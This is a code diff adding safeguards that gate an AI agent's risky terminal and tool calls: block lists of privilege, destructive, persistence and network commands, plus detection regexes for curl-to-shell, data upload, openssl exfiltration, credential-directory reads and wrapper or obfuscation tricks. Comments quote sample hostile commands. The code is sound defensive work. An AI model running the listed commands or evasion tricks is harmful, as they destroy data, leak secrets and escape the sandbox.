+        "title",
+        "summary",
+        "note",
+        "notes",
+        "prompt",
+        "caption",
+        "reason",
+        "markdown",
+        "blocks",
+        "detail",
+        "details",
+        "context",
+    }
+)
+# Argument names that carry a statement the tool will execute, as opposed to
+# free text the tool will merely store or display.
+_MCP_QUERY_KEYS = frozenset(
+    {
+        "query",
+        "sql",
+        "statement",
+        "stmt",
+        "command",
+        "cmd",
+        "script",
+        "expression",
+        "expr",
+        "filter",
+        "pipeline",
+        "aggregate",
+        "mutation",
+        "operation",
+        "graphql",
+        "queries",
+        "statements",
+        "commands",
+    }
+)
+
+
 def _mcp_arguments_mutate(arguments) -> bool:
     """True if an MCP call's arguments carry a mutating command, so a read-named
     but write-capable tool (query_database {"query": "DELETE FROM runs"},
     query_graphql {"query": "mutation { deleteIssue(id: 1) }"}, or an HTTP tool
     {"method": "DELETE"}) asks."""
 
-    def walk(value) -> bool:
+    def walk(value, in_query: bool = False) -> bool:
         if isinstance(value, str):
+            # Prose that merely mentions DELETE FROM (a chat message, an issue
+            # body) is not a statement this call will run.
+            if not in_query:
+                return False
             _sql = _SQL_COMMENT_RE.sub(" ", value)
             return (
                 bool(_MCP_ARG_MUTATION_RE.search(_sql))
@@ -2368,9 +3007,12 @@ def _mcp_arguments_mutate(arguments) -> bool:
                     and v.strip().upper() in _MUTATING_HTTP_METHODS
                 ):
                     return True
-            return any(walk(v) for v in value.values())
+            return any(
+                walk(v, in_query or (isinstance(k, str) and k.lower() in _MCP_QUERY_KEYS))
+                for k, v in value.items()
+            )
         if isinstance(value, (list, tuple)):
-            return any(walk(v) for v in value)
+            return any(walk(v, in_query) for v in value)
         return False
 
     return walk(arguments)
@@ -2416,6 +3058,12 @@ _RENDER_HTML_NETWORK_RE = re.compile(
     # Bracket-access obfuscation: window['fetch'](...), self["open"](...).
     r"\[\s*[\"'](?:fetch|open|XMLHttpRequest|WebSocket|EventSource|importScripts|"
     r"sendBeacon|serviceWorker)[\"']\s*\]|"
+    # The same for the navigation sinks: location['assign'](...),
+    # location["href"] = URL. Anchored to location (dotted or bracketed) so an
+    # ordinary str['replace'](...) or obj['href'] read stays static.
+    r"(?:\blocation|\[\s*[\"']location[\"']\s*\])\s*\[\s*[\"'](?:assign|replace)[\"']\s*\]\s*\(|"
+    r"(?:\blocation|\[\s*[\"']location[\"']\s*\])\s*\[\s*[\"']href[\"']\s*\]"
+    r"\s*=\s*[\"'`]?\s*(?:https?:|/)|"
     # Computed bracket key spliced at runtime on a global host object
     # (window['fet'+'ch'](...)): a quoted fragment adjacent to a + inside the
     # index. Anchored to a host object so a plain obj['a'+'b'] key stays safe.
@@ -2491,6 +3139,1685 @@ def is_potentially_unsafe_tool_call(name: str, arguments: dict) -> bool:
         return _terminal_is_potentially_unsafe(str(arguments.get("command", "")))
     if name == "python":
         return _python_is_potentially_unsafe(str(arguments.get("code", "")))
+    return True
+
+
+# Terminal commands that are high risk regardless of their arguments, so auto
+# ("Approve for me") pauses them while ordinary dev commands (pip install, mkdir,
+# cp, make, git, ...) run. The hard-block command set, rlimits, secret-env
+# stripping and the per-session scratch workdir stay on beneath this prompt.
+_HIGH_RISK_COMMANDS = frozenset(
+    {
+        # privilege escalation
+        "sudo",
+        "su",
+        "doas",
+        "pkexec",
+        # destructive filesystem / storage devices (mkfs* matched by prefix)
+        "rm",
+        "rmdir",
+        "shred",
+        "dd",
+        "wipefs",
+        "fdisk",
+        "parted",
+        "blkdiscard",
+        "chattr",
+        "truncate",
+        # Windows cmd.exe built-ins that delete files / trees (the terminal
+        # executor runs `cmd /c` there, and these are not in _BLOCKED_COMMANDS_WIN)
+        "del",
+        "erase",
+        "rd",
+        # Ending a process kills work in progress (a training run, the server
+        # itself); a power command ends every process at once.
+        "kill",
+        "pkill",
+        "killall",
+        "taskkill",
+        "tskill",
+        "shutdown",
+        "reboot",
+        "halt",
+        "poweroff",
+        # setcap grants file capabilities, a privilege change without sudo.
+        "setcap",
+        # accounts / persistence / system services
+        "crontab",
+        # at/batch hand the payload to atd, which runs it later as this user and
+        # outside this invocation's blocklist, rlimits, timeout and cancellation.
+        "at",
+        "batch",
+        "atrm",
+        "systemctl",
+        "service",
+        "useradd",
+        "userdel",
+        "usermod",
+        "groupadd",
+        "groupdel",
+        "groupmod",
+        "adduser",
+        "deluser",
+        "addgroup",
+        "delgroup",
+        "gpasswd",
+        "newusers",
+        "chgpasswd",
+        "passwd",
+        "chpasswd",
+        "visudo",
+        "chsh",
+        # firewall / mounts
+        "iptables",
+        "ip6tables",
+        "nft",
+        "ufw",
+        "mount",
+        "umount",
+        # remote exec / raw network transfer
+        "ssh",
+        "slogin",
+        "scp",
+        "sftp",
+        "telnet",
+        "nc",
+        "ncat",
+        "netcat",
+        "socat",
+        "ftp",
+        "tftp",
+        # POSIX unlink(1) deletes a file exactly like rm, which is gated above.
+        "unlink",
+        # Windows / macOS storage destruction, the platform twins of the POSIX
+        # mkfs/wipefs/dd family already gated above.
+        "format",
+        "diskpart",
+        "diskutil",
+        # Windows / macOS scheduled tasks, registry and service control: the twins
+        # of crontab/systemctl. Gated wholesale (a read-only `reg query` prompts
+        # too) because the destructive subcommand lives in the arguments.
+        "systemd-run",
+        "schtasks",
+        "reg",
+        "sc",
+        "launchctl",
+        # container/VM runtimes: the daemon acts with host privileges, so
+        # `docker run -v /:/host ...` writes the real filesystem, escaping the
+        # child's workdir and rlimit sandbox entirely. chroot/nsenter/unshare
+        # cross a privilege or namespace boundary and then exec a nested command,
+        # so the wrapper hides the real action.
+        "chroot",
+        "nsenter",
+        "unshare",
+        "docker",
+        "podman",
+        "nerdctl",
+        "ctr",
+        "crictl",
+        "lxc",
+        "machinectl",
+        "kubectl",
+    }
+)
+# sysctl's write and load forms change kernel parameters; a read-only query
+# (sysctl -a, sysctl net.ipv4.ip_forward) stays automatic.
+_SYSCTL_WRITE_FLAGS = frozenset({"-w", "--write", "-p", "--load", "--system"})
+# setpriv changes privilege state and then execs its remaining arguments, so the
+# real command sits behind it. Kept out of _AUTO_SAFE_WRAPPERS (it is not safe in
+# its own right) and instead made transparent only for the high-risk scan, where
+# the flags that raise privilege are gated on their own.
+_PRIVILEGE_EXEC_WRAPPERS = frozenset({"setpriv"})
+_SETPRIV_PRIVILEGE_FLAGS = frozenset(
+    {
+        "--reuid",
+        "--regid",
+        "--ruid",
+        "--euid",
+        "--rgid",
+        "--egid",
+        "--groups",
+        "--init-groups",
+        "--inh-caps",
+        "--ambient-caps",
+        "--bounding-set",
+        "--securebits",
+        "--selinux-label",
+        "--apparmor-profile",
+    }
+)
+# fallocate replaces a range with a hole, zeroes it or removes it, destroying
+# file contents in place. Plain allocation (-l SIZE) only grows a file.
+_FALLOCATE_DESTRUCTIVE_FLAGS = frozenset(
+    {"-p", "--punch-hole", "-z", "--zero-range", "-c", "--collapse-range", "-d", "--dig-holes"}
+)
+# High risk only with a recursive flag (chmod -R 777 .); a scoped
+# `chmod +x build.sh` stays out.
+_HIGH_RISK_RECURSIVE_COMMANDS = frozenset({"chmod", "chown", "chgrp"})
+# Commands that forward command position to a following command name
+# (find . -exec rm, echo x | xargs rm, parallel rm, watch rm), so the wrapped
+# command is checked against the high-risk sets too.
+_HIGH_RISK_FORWARDING_COMMANDS = frozenset(
+    {
+        "find",
+        "fd",
+        "xargs",
+        "parallel",
+        "watch",
+        "strace",
+        "ltrace",
+        "ktrace",
+        "dtruss",
+        "perf",
+        "valgrind",
+    }
+)
+# Of those, find/fd only execute a child after an explicit -exec-style flag.
+# A tracer or profiler runs the rest of the line as a child process, so the
+# real command sits in argument position behind it.
+_TRACER_LAUNCHERS = frozenset({"strace", "ltrace", "ktrace", "dtruss", "perf", "valgrind"})
+_EXEC_FLAG_FORWARDING_COMMANDS = frozenset({"find", "fd"})
+_EXEC_FORWARD_FLAGS = frozenset(
+    {"-exec", "-execdir", "-ok", "-okdir", "--exec", "--exec-batch", "-x", "-X"}
+)
+# The long forms also accept the command attached to the flag (fd --exec=rm),
+# where the value is command position rather than a discarded option argument.
+_ATTACHED_EXEC_FLAGS = frozenset({"-exec", "-execdir", "--exec", "--exec-batch"})
+# find/fd flags that delete matches outright (a bare `find . -delete`, with no
+# separate command token to catch); an `-exec rm` is caught via forwarding.
+_HIGH_RISK_FIND_FLAGS = frozenset({"-delete"})
+# Flags whose VALUE is a command the tool then executes, so a payload (even a
+# hard-blocked one) rides inside an argument instead of at command position.
+# GNU tar --checkpoint-action=exec=CMD, rsync/scp -e REMOTE_SHELL.
+_HIGH_RISK_ARG_EXEC_FLAGS = frozenset({"--checkpoint-action", "--rsh", "--rsync-path"})
+# ...but only for the utilities that actually run them; otherwise a mere
+# mention (printf '%s' --rsh, a grep for the flag name) would prompt.
+_ARG_EXEC_FLAG_OWNERS = frozenset({"tar", "gtar", "bsdtar", "rsync", "scp", "sftp"})
+# An interpreter run as a network server (python -m http.server, uvicorn app:api)
+# listens on a socket; the sandbox has no network namespace, so the session
+# workdir becomes reachable wherever that port is exposed. Position-scoped, since
+# a bare mention (pip install uvicorn, grep uvicorn reqs.txt) starts no listener.
+_LISTENER_PY_MODULES = (
+    r"http\.server|SimpleHTTPServer|uvicorn|gunicorn|waitress|flask|"
+    r"twisted|websockets|aiohttp\.web"
+)
+_LISTENER_PY_MODULE_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*(?:\S*/)?"
+    r"(?:python|pypy)[0-9.]*\s+(?:-\S+\s+)*-m\s+(?:" + _LISTENER_PY_MODULES + r")\b",
+    re.IGNORECASE,
+)
+# The same modules as the command-position regex, matched after wrapper
+# resolution so `env python -m http.server` and `timeout 60 python -m ...`
+# are seen too.
+_LISTENER_PY_MODULE_NAMES = frozenset(
+    {
+        "http.server",
+        "simplehttpserver",
+        "uvicorn",
+        "gunicorn",
+        "waitress",
+        "flask",
+        "twisted",
+        "websockets",
+        "aiohttp.web",
+    }
+)
+_LISTENER_BINARIES = frozenset({"uvicorn", "gunicorn", "waitress-serve", "hypercorn", "daphne"})
+_LISTENER_BIN_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
+    r"(?:uvicorn|gunicorn|waitress-serve|hypercorn|daphne)\b"
+)
+# curl upload/POST flags: local data sent out (exfiltration surface). The short
+# forms may be attached (-d@f, -Ffile=@dump.sql), so they match prefix-wise.
+_CURL_UPLOAD_LONG_FLAGS = frozenset(
+    {
+        "--data",
+        "--data-ascii",
+        "--data-binary",
+        "--data-raw",
+        "--data-urlencode",
+        "--form",
+        "--upload-file",
+    }
+)
+_CURL_UPLOAD_SHORT_FLAGS = ("-d", "-F", "-T")
+# curl's explicit-method flags and the methods that mutate/delete a remote
+# resource (a plain GET download stays out). POST is omitted: it is the ordinary
+# upload verb and is already caught by the body/upload flags above.
+# wget spells the request method --method=DELETE.
+_WGET_METHOD_FLAGS = frozenset({"--method"})
+_CURL_METHOD_FLAGS = frozenset({"-X", "--request"})
+_CURL_DESTRUCTIVE_METHODS = frozenset({"delete", "put", "patch"})
+# wget upload/POST flags. Kept separate from curl's so a benign wget short option
+# (wget -T 10 timeout, wget -F force-html) is not misread as an upload.
+_WGET_UPLOAD_FLAGS = frozenset({"--post-data", "--post-file", "--body-data", "--body-file"})
+# curl/wget output piped straight into an interpreter is remote code execution.
+_PIPE_TO_INTERPRETER_RE = re.compile(
+    r"\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh|fish|python[0-9.]*|node|ruby|perl|php)\b"
+)
+_BARE_TRUNCATING_REDIRECT_RE = re.compile(r"(?:^|[;&|\n(]|&&|\|\|)\s*(?::|true)?\s*>(?!>)\s*\S")
+_HERESTRING_TO_INTERPRETER_RE = re.compile(
+    r"\b(?:sh|bash|zsh|dash|ksh|fish|ash|python[0-9.]*|node|ruby|perl|php)\b[^\n]*<<<"
+)
+# An interpreter that executes a process substitution's output as a script
+# (bash <(printf 'rm -rf x'), source <(...)): the generated content is never
+# literal text, so it is unscreenable and fails closed. A non-interpreter consumer
+# (diff <(sort a) <(sort b)) only reads the file and stays out.
+_PROC_SUBST_EXEC_RE = re.compile(
+    r"\b(?:sh|bash|zsh|dash|ksh|fish|ash|source|eval|python[0-9.]*|node|nodejs|bun|ruby|perl|php)\b"
+    r"[^\n]*<\("
+    r"|(?:^|[;&|\n(]|&&|\|\|)\s*\.\s+<\("
+)
+# Network clients beyond curl/wget that open a socket to a remote host: the
+# sandbox has no network namespace, so they can exfil the workdir or fetch and run
+# remote code. Command position only, so a filename argument (scp ./ssh_notes.txt)
+# is not misread as the command.
+_NETWORK_CLIENT_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
+    r"(?:nc|ncat|netcat|telnet|socat|ssh|slogin|scp|sftp)\b"
+)
+# openssl's s_client/s_server open a TLS socket, the classic no-curl exfil channel
+# (tar czf - . | openssl s_client -connect host:443). Plain openssl (dgst, enc) is
+# local and stays out. Matched on the resolved command segment, so the wrapped
+# forms (env openssl s_client) are seen too.
+_OPENSSL_NETWORK_SUBCOMMANDS = frozenset({"s_client", "s_server"})
+# `getent shadow` returns password hashes straight from NSS, so the read
+# never spells out /etc/shadow for the path check to find.
+_GETENT_CREDENTIAL_DATABASES = frozenset({"shadow", "gshadow"})
+_OPENSSL_NETWORK_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*(?:\S*/)?openssl\s+s_(?:client|server)\b"
+)
+# An array expansion (${x[*]}, ${x[@]}) builds a command from elements the static
+# scan cannot resolve; fed to a shell -c/eval it runs an unscreened payload.
+# Paired with the var-executed-as-command test so `echo "${a[@]}"` is left alone.
+_ARRAY_EXPANSION_RE = re.compile(r"\$\{\w+\[[@*]\]\}")
+# A wrapper's bare duration/count argument (timeout 5 rm, timeout 1.5s rm) that
+# precedes the real command, so it is not mistaken for the command itself.
+_WRAPPER_DURATION_RE = re.compile(r"\d+(?:\.\d+)?[smhd]?$")
+# Wrapper options whose VALUE is a separate token (env -u NAME, nice -n 5).
+# Without consuming the value it is mistaken for the wrapped command, so
+# `env -u FOO rm -rf x` reads as the command `FOO` and the real `rm` is missed.
+_WRAPPER_VALUE_FLAGS_BY_CMD = {
+    # env -i/--ignore-environment is VALUELESS; only -u/--unset takes a name.
+    "env": frozenset({"-u", "--unset"}),
+    "stdbuf": frozenset({"-i", "--input", "-o", "--output", "-e", "--error"}),
+    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
+    "nice": frozenset({"-n", "--adjustment"}),
+    "ionice": frozenset({"-c", "--class", "-n", "--classdata", "-p", "--pid"}),
+    "xargs": frozenset(
+        {"-I", "-L", "-P", "-d", "--delimiter", "-a", "--arg-file", "-n", "-s", "-E"}
+    ),
+    "chroot": frozenset({"--userspec", "--groups"}),
+    # setpriv <options> <program>: only the value-taking options consume a token.
+    "setpriv": frozenset(
+        {
+            "--reuid",
+            "--regid",
+            "--groups",
+            "--inh-caps",
+            "--ambient-caps",
+            "--bounding-set",
+            "--securebits",
+            "--pdeathsig",
+            "--selinux-label",
+            "--apparmor-profile",
+            "--landlock-access",
+            "--landlock-rule",
+        }
+    ),
+    # exec -a NAME runs cmd under NAME, so NAME is a value, not the command.
+    "exec": frozenset({"-a"}),
+    "setsid": frozenset(),
+    "nohup": frozenset(),
+}
+# Non-shell interpreters running an inline program (python -c, node -e, php -r):
+# the terminal path never screens that program the way the python tool does.
+# sh/bash -c are omitted, the hard-block already recurses into their payloads.
+_INLINE_CODE_INTERPRETERS = frozenset(
+    {
+        "python",
+        "python2",
+        "python3",
+        "pypy",
+        "pypy3",
+        "node",
+        "nodejs",
+        "deno",
+        "bun",
+        "ruby",
+        "perl",
+        "php",
+    }
+)
+_INLINE_CODE_FLAGS = frozenset({"-c", "-e", "-E", "-r", "--eval", "--exec"})
+# Inline-code flags are per-interpreter: a flag that evaluates code for one runtime
+# is an ordinary option for another (`python -E` ignores PYTHON* env, it is not
+# eval). Value is (exact flags, short letters that may appear in a cluster).
+_INLINE_CODE_FLAG_SPEC = {
+    "python": (frozenset({"-c"}), "c"),
+    "pypy": (frozenset({"-c"}), "c"),
+    "node": (frozenset({"-e", "--eval"}), "e"),
+    "nodejs": (frozenset({"-e", "--eval"}), "e"),
+    "deno": (frozenset({"-e", "--eval"}), "e"),
+    "bun": (frozenset({"-e", "--eval"}), "e"),
+    "ruby": (frozenset({"-e"}), "e"),
+    # perl -e and -E both run a one-liner (-E also enables feature bundles).
+    "perl": (frozenset({"-e", "-E"}), "eE"),
+    # php -r runs code; -B / -R / -E run begin / per-line / end code.
+    "php": (frozenset({"-r", "-B", "-R", "-E"}), "rBRE"),
+}
+
+
+def _inline_code_flag_spec(name: str):
+    """(exact flags, short-cluster letters) that make `name` run inline code."""
+    base = name
+    if _VERSIONED_INTERPRETER_RE.match(base):
+        base = re.sub(r"\d+(?:\.\d+)*$", "", base)
+    else:
+        base = re.sub(r"^(python|pypy)[23]$", r"\1", base)
+    return _INLINE_CODE_FLAG_SPEC.get(base)
+
+
+# node/bun evaluate and print the argument to -p / --print, arbitrary code just
+# like -e/--eval. Scoped to the JS runtimes: -p is a print-loop switch for
+# perl/ruby/sed, not inline eval.
+_NODE_PRINT_INTERPRETERS = frozenset({"node", "nodejs", "bun"})
+# Runtimes that expose inline evaluation as a SUBCOMMAND (deno eval "...",
+# bun eval "..."), which the flag scan above never sees.
+_EVAL_SUBCOMMAND_INTERPRETERS = frozenset({"deno", "bun"})
+_NODE_PRINT_FLAGS = frozenset({"-p", "--print"})
+# Windows cmd.exe runs the rest of the line as a nested command after /c (or /k),
+# so the payload is screened recursively like a shell -c payload. cmd is not in
+# the hard-block set, and del/erase/rd were added to the high-risk set for it.
+_CMD_SHELLS = frozenset({"cmd"})
+# PowerShell runs an arbitrary inline program passed to -Command /
+# -EncodedCommand (and their unambiguous prefixes), which the terminal path cannot
+# parse. On Windows both names are hard-blocked; elsewhere pwsh is not, so gate an
+# inline-command invocation there. A bare `pwsh script.ps1` file run stays out.
+_POWERSHELL_INTERPRETERS = frozenset({"powershell", "pwsh"})
+# Versioned interpreter binaries (python3.11, python2.7, pypy3.10) are the same
+# inline-code risk as their unversioned names, so recognise the version suffix.
+_VERSIONED_INTERPRETER_RE = re.compile(r"^(?:python|pypy|perl|ruby|php|node)\d+(?:\.\d+)*$")
+# busybox / toybox dispatch to an applet given as the first argument, so the
+# applet, not the multicall binary, is the command whose risk is judged.
+_MULTICALL_BINARIES = frozenset({"busybox", "toybox"})
+# `cd /proc/$PPID; cat environ` reads a sensitive path after the chdir even though
+# no single token spells it out, so a chdir into a sensitive dir is gated.
+_CHDIR_COMMANDS = frozenset({"cd", "pushd", "chdir"})
+# The absolute system dirs are anchored so an unrelated user dir (/home/x/etc)
+# does not match; the credential dotfile dirs match anywhere in the path.
+_SENSITIVE_CHDIR_RE = re.compile(
+    r"^~?/proc/[^/\s'\"]+"
+    r"|^~?/etc(?:/|$)"
+    r"|^~?/root(?:/|$)"
+    r"|^~?/(?:var/)?run/secrets(?:/|$)"
+    r"|(?:^|[/\\])\.(?:ssh|aws|azure|gnupg|docker|kube)(?:[/\\]|$)"
+    r"|(?:^|[/\\])\.config[/\\](?:gcloud|gh)(?:[/\\]|$)",
+    re.IGNORECASE,
+)
+
+
+def _is_inline_code_interpreter(name: str) -> bool:
+    """True for an interpreter whose ``-c`` / ``-e`` runs an inline program the
+    terminal path never screens, including versioned python/pypy binaries."""
+    return name in _INLINE_CODE_INTERPRETERS or bool(_VERSIONED_INTERPRETER_RE.match(name))
+
+
+def _short_flag_cluster(token: str) -> "list[str]":
+    """Split a combined short-option token into its individual flags
+    (`-qf` -> ['-q', '-f']). A long option, a `-x=value` form or a bare `-`
+    yields nothing, so only genuine clusters are expanded."""
+    if len(token) < 3 or not token.startswith("-") or token.startswith("--") or "=" in token:
+        return []
+    return ["-" + ch for ch in token[1:]]
+
+
+def _short_flag_arg(token: str, letters: str) -> "str | None":
+    """For a short-flag cluster (``-lc``, ``-Bc``, ``-c``), if one of ``letters``
+    appears as a flag in it, return the text glued after that letter -- ``""`` when
+    the value is the next token, or the attached payload for ``-c'cmd'``. ``None``
+    when no such flag is present, or for long options / non-flags. Catches combined
+    forms (``bash -lc 'git clean'``) an exact ``-c`` match would miss."""
+    if not token.startswith("-") or token.startswith("--"):
+        return None
+    body = token[1:]
+    for i, ch in enumerate(body):
+        if ch in letters:
+            return body[i + 1 :]
+    return None
+
+
+# git subcommands that discard or overwrite work: `clean` deletes untracked files,
+# `restore` overwrites the worktree from the index/HEAD, `rm` deletes tracked
+# files, and the plumbing entries delete refs/reflogs/objects or rewrite history.
+# `reset`/`push`/`checkout` only qualify with a destructive flag or pathspec, so
+# `git reset --soft`, a plain `git push` and ordinary git (add/commit/log) run.
+_HIGH_RISK_GIT_SUBCOMMANDS = frozenset(
+    {"clean", "restore", "rm", "update-ref", "filter-branch", "prune", "gc", "reflog"}
+)
+_HIGH_RISK_GIT_RESET_FLAGS = frozenset({"--hard"})
+_HIGH_RISK_GIT_PUSH_FLAGS = frozenset(
+    # --delete/-d removes a remote ref; --mirror and --prune delete remote refs
+    # that are absent locally. All are remote data loss, like a force push.
+    {"-f", "--force", "--force-with-lease", "-d", "--delete", "--mirror", "--prune"}
+)
+# `git worktree remove --force` deletes a linked worktree even when it holds
+# uncommitted work or is locked. An unforced remove refuses on a dirty worktree,
+# so it stays out.
+_HIGH_RISK_GIT_WORKTREE_FLAGS = frozenset({"-f", "--force"})
+# `git switch -f/--discard-changes` throws away tracked working-tree edits.
+_HIGH_RISK_GIT_SWITCH_FLAGS = frozenset({"-C", "-f", "--force", "--discard-changes"})
+# `git branch -D` force-deletes a branch, discarding unmerged commits; -M
+# force-renames over an existing branch. Plain -d/--delete refuses to drop
+# unmerged work, so it stays out.
+_HIGH_RISK_GIT_BRANCH_FLAGS = frozenset({"-D", "-M", "-f", "--force"})
+# `git stash clear` / `drop` destroy stashed work with no reflog to recover it.
+_HIGH_RISK_GIT_STASH_ACTIONS = frozenset({"clear", "drop"})
+# `git checkout -- <path>` / `git checkout .` / `git checkout -f` discard tracked
+# working-tree changes; a bare `git checkout <branch>` (switching) does not.
+_HIGH_RISK_GIT_CHECKOUT_FLAGS = frozenset({"-f", "--force", "-B"})
+# `git checkout-index -f` overwrites working-tree files from the index.
+_HIGH_RISK_GIT_CHECKOUT_INDEX_FLAGS = frozenset({"-f", "--force"})
+# `git tag -d` deletes a ref; `git tag -f` replaces one that already exists.
+_HIGH_RISK_GIT_TAG_FLAGS = frozenset({"-d", "--delete", "-f", "--force"})
+# `git -c alias.NAME=PAYLOAD` defines an alias git then runs; a leading `!` makes
+# the payload a shell command.
+_GIT_ALIAS_ASSIGN_RE = re.compile(r"^alias\.[^=]+=(.*)$", re.DOTALL)
+# `git --config-env=alias.n=VAR n` names an environment variable whose value
+# becomes the alias body, so the code is never present in the command text.
+_GIT_CONFIG_ENV_ALIAS_RE = re.compile(r"(?:^|=)alias\.", re.IGNORECASE)
+# git global options taking a separate value token (git -C repo clean); the value
+# must be consumed so it is not mistaken for the subcommand.
+_GIT_GLOBAL_VALUE_FLAGS = frozenset(
+    {"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"}
+)
+# Shells whose `-c PAYLOAD` runs an inline program: the payload is recursively
+# screened, so a high-risk command wrapped in `bash -c '...'` is still caught. The
+# hard-block only recurses for its own smaller command set.
+_SHELL_C_INTERPRETERS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "fish", "ash"})
+# A command synthesized by a command substitution at command position
+# ($(printf rm) -rf build) cannot be read statically. A substitution in argument
+# position (echo $(date), make $(FILES)) is left alone.
+_COMMAND_SUBST_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=[^\s;&|()]*\s+)*(?:\$\(|`)"
+)
+
+# A command substitution appearing anywhere ($(...) that is not arithmetic
+# $((...)), or a backtick). Used to catch a substitution stashed in a variable
+# (x=`...`) that a later dynamic exec runs, which never surfaces as literal text.
+_HAS_COMMAND_SUBST_RE = re.compile(r"\$\((?!\()|`")
+# The same as below, but only when the expansion is the WHOLE command word. A
+# variable used as a path prefix (${VENV}/bin/python) still leaves a literal
+# basename the scan can screen, so it is not unresolvable.
+_BARE_VAR_AS_COMMAND_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*\$\{?\w+\}?(?=\s|$)"
+)
+# A variable expansion executed as a command: $VAR at command position, or a shell
+# `-c` / eval whose payload contains a `$` expansion. Paired with
+# _HAS_COMMAND_SUBST_RE this flags `x=`printf 'git clean -fd'`; bash -c "$x"`,
+# assembled at runtime and so unscreenable statically.
+_VAR_EXECUTED_AS_COMMAND_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*\$\{?\w"
+    r"|\b(?:sh|bash|zsh|dash|ksh|ash)\b[^\n]*?\s-c\b[^\n]*\$"
+    r"|\beval\b[^\n]*\$"
+)
+
+
+_SHELL_SEGMENT_SPLIT_RE = re.compile(r"^(?:;|&&|\|\||\||&)$")
+
+
+# Wrappers that may sit in front of a network client without changing what it
+# does, so the client is still at command position behind them.
+_CLIENT_WRAPPERS = frozenset(
+    {"env", "command", "timeout", "nohup", "nice", "ionice", "stdbuf", "setsid", "exec"}
+)
+_CLIENT_WRAPPER_PREFIX = (
+    r"(?:(?:env|command|timeout|nohup|nice|ionice|stdbuf|setsid|exec)\s+"
+    r"(?:-\S+\s+|\d+(?:\.\d+)?[smhd]?\s+)*)*"
+)
+# The terminal sandbox shares the backend's installed environment, so removing
+# a package (pip uninstall torch) breaks the running process. Installing does
+# not, and is ordinary work, so only the removal verbs are gated.
+_PKG_REMOVE_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*(?:\S*/)?"
+    r"(?:(?:python[0-9.]*\s+-m\s+)?pip[0-9]*|uv\s+pip|pipx|conda|mamba|micromamba)"
+    r"\s+(?:uninstall|remove)\b",
+    re.IGNORECASE,
+)
+_CURL_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
+    + _CLIENT_WRAPPER_PREFIX
+    + r"(?:\S*/)?curl\b",
+    re.IGNORECASE,
+)
+_WGET_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
+    + _CLIENT_WRAPPER_PREFIX
+    + r"(?:\S*/)?wget\b",
+    re.IGNORECASE,
+)
+
+
+def _tokens_for_client_segment(tokens: list, has_curl: bool, has_wget: bool):
+    """Tokens of the segments whose command is curl/wget, or None if there is no
+    such segment. Keeps an unrelated command's option letters out of the upload
+    scan (`ls -T && echo curl`)."""
+    segments: list = []
+    current: list = []
+    for t in tokens:
+        if _SHELL_SEGMENT_SPLIT_RE.match(t):
+            segments.append(current)
+            current = []
+        else:
+            current.append(t)
+    segments.append(current)
+    kept: list = []
+    for seg in segments:
+        # Skip leading NAME=value prefixes to find the command word.
+        i = 0
+        while i < len(seg) and re.match(r"^[A-Za-z_]\w*=", seg[i]):
+            i += 1
+        if i >= len(seg):
+            continue
+        # Step past a wrapper (env curl, timeout 5 curl) to the real client.
+        while i < len(seg):
+            base = os.path.basename(seg[i].strip(";&|()`{}")).lower()
+            if base not in _CLIENT_WRAPPERS:
+                break
+            i += 1
+            while i < len(seg) and (seg[i].startswith("-") or _WRAPPER_DURATION_RE.match(seg[i])):
+                i += 1
+        if i >= len(seg):
+            continue
+        base = os.path.basename(seg[i].strip(";&|()`{}")).lower()
+        if (has_curl and base == "curl") or (has_wget and base == "wget"):
+            kept.extend(seg[i:])
+    return kept or None
+
+
+def _command_is_network_exec_or_exfil(command: str) -> bool:
+    """curl/wget used to run remote code (piped into a shell, or via process
+    substitution) or to upload local data. Plain downloads (curl -O, wget URL)
+    are ordinary and stay out. Fails closed on an unparseable command."""
+    low = command.lower()
+    # A non-curl/wget client (nc/ssh/socat) or openssl's TLS socket is a remote
+    # reach in its own right, so gate it before the upload-flag logic below.
+    if _NETWORK_CLIENT_AT_CMD_RE.search(command) or _OPENSSL_NETWORK_RE.search(low):
+        return True
+    # A mention in argument position (`grep curl notes.txt`) is not an invocation,
+    # and treating it as one lends another command's option letters to the scan.
+    has_curl = bool(_CURL_AT_CMD_RE.search(command))
+    has_wget = bool(_WGET_AT_CMD_RE.search(command))
+    if not has_curl and not has_wget:
+        return False
+    if _PIPE_TO_INTERPRETER_RE.search(low):
+        return True
+    if "<(" in command:  # bash <(curl ...) process substitution
+        return True
+    try:
+        tokens = shlex.split(command.replace("\n", " "), posix = True)
+    except ValueError:
+        return True
+    # Scope the flag scan to the segment that actually runs curl/wget: a shared
+    # option letter from an unrelated command (`ls -T && echo curl`) is not an
+    # upload flag.
+    tokens = _tokens_for_client_segment(tokens, has_curl, has_wget)
+    if tokens is None:
+        return False
+    method_pending = False
+    for t in tokens:
+        name = t.split("=", 1)[0]
+        # curl -X DELETE / --request PUT mutates a remote resource, not a plain
+        # download. Separated, attached (-XDELETE) and --request=DELETE forms.
+        if has_curl:
+            if method_pending:
+                method_pending = False
+                if t.lower() in _CURL_DESTRUCTIVE_METHODS:
+                    return True
+            if name in _CURL_METHOD_FLAGS:
